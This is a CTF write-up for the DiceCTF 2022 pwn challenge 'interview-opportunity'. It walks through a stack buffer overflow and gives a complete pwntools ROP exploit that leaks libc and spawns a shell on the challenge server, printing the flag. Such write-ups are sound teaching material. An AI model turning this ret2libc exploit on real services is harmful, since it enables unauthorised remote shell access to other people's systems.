# DiceCTF 2022

## pwn/interview-opportunity

> Good luck on your interview...
> 
> `nc mc.ax 31081`
>
> Author: smoothhacker
> 
> [`interview-opportunity`](interview-opportunity) [`libc.so.6`](libc.so.6)

Tags: _pwn_ _x86-64_ _bof_ _rop_ _remote-shell_


## Summary

Standard babyrop; leak libc, score second pass, get shell.


## Analysis

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

No PIE, no canary, easy BOF/ROP.


### Ghidra Decompile

```c
undefined8 main(undefined4 param_1,undefined8 param_2)
{
  char local_22 [10];
  undefined8 local_18;
  undefined4 local_c;
  
  local_18 = param_2;
  local_c = param_1;
  env_setup();
  printf("Thank you for you interest in applying to DiceGang. We need great pwners like you to continue our traditions and competition against perfect blue.\n");
  printf("So tell us. Why should you join DiceGang?\n");
  read(0,local_22,0x46);
  puts("Hello: ");
  puts(local_22);
  return 0;
}
```

`read(0,local_22,0x46);` is your vulnerability.  Reading `0x46` bytes into a buffer only `0x22` bytes (`local_22`) from the return address on the stack.  Classic BOF/ROP fodder.

> I've done too many write ups for this type of challenge, please read one of them for details, e.g. [roprop](https://github.com/datajerk/ctf-write-ups/tree/master/darkctf2020/roprop) and see [INDEX.md](https://github.com/datajerk/ctf-write-ups/blob/master/INDEX.md) for a complete list.


## Exploit

```python
#!/usr/bin/python3

from pwn import *

binary = context.binary = ELF('./interview-opportunity', checksec=False)

if args.REMOTE:
    libc = ELF('./libc.so.6', checksec=False)
    p = remote('mc.ax', 31081)
else:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    p = process(binary.path)

pop_rdi = binary.search(asm('pop rdi; ret')).__next__()

payload  = b''
payload += 0x22 * b'A'
payload += p64(pop_rdi)
payload += p64(binary.got.puts)
payload += p64(binary.plt.puts)
payload += p64(binary.sym.main)

p.sendline(payload)
for i in range(4): p.recvline()

_ = p.recv(6)
puts = u64(_ + b'\0\0')
libc.address = puts - libc.sym.puts
log.info('libc.address: {x}'.format(x = hex(libc.address)))

payload  = 0x22 * b'A'
payload += p64(pop_rdi + 1)
payload += p64(pop_rdi)
payload += p64(libc.search(b'/bin/sh').__next__())
payload += p64(libc.sym.system)

p.sendlineafter(b'DiceGang?\n',payload)
for i in range(2): p.recvline()
p.interactive()
```

Output:

```bash
# ./exploit.py REMOTE=1
[+] Opening connection to mc.ax on port 31081: Done
[*] libc.address: 0x7f0a7a44d000
[*] Switching to interactive mode
$ cat flag.txt
dice{0ur_f16h7_70_b347_p3rf3c7_blu3_5h4ll_c0n71nu3}
```